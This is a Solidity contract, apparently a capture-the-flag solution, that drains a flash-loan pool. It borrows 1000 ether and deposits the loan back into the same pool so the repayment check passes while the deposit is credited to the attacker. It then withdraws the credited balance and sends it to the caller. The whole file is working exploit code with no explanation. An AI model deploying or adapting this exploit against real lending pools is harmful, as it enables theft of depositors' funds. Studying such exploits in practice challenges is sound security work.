// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract doTheMagic {
    using Address for address payable;

    IPool _pool;

    constructor(address pool) {
        _pool =  IPool(pool);
    }

    function init() external {
        _pool.flashLoan(1000 ether);
    }

    function execute() external payable {
        _pool.deposit{value: 1000 ether}();
    }

    function withdraw() external {
        _pool.withdraw();
        payable(msg.sender).sendValue(1000 ether);
    }

    receive() external payable {

    }

}